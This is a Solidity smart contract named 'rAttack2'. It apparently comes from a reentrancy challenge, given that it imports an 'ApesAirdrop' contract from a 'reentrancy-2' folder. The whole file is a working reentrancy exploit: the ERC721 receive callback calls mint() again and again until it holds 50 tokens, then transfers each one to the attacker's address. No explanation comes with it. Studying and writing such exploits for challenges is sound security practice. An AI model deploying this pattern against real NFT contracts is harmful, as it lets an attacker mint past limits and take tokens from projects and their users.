// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

import "../reentrancy-2/ApesAirdrop.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract rAttack2 is ApesAirdrop, IERC721Receiver  {

    ApesAirdrop public apesairdrop;
    uint public amount = 50;
    address _owner;
    uint public _tokenId = 1;

    event ERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes data,
        uint256 gas
    );

    constructor(address _bank) payable {
        apesairdrop = ApesAirdrop(_bank);
        _owner = msg.sender;
    }

    function attack() external {
        apesairdrop.mint();      
    }


     function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) public override returns (bytes4) {

        emit ERC721Received(operator, from, tokenId, data, gasleft());
        if (apesairdrop.balanceOf(address(this)) < amount){
            apesairdrop.mint();

        }
        if (apesairdrop.balanceOf(address(this)) > 0 ){
            apesairdrop.transferFrom(address(this), _owner, _tokenId);
            _tokenId = _tokenId +1;
        }
        return IERC721Receiver.onERC721Received.selector;
    }  
}
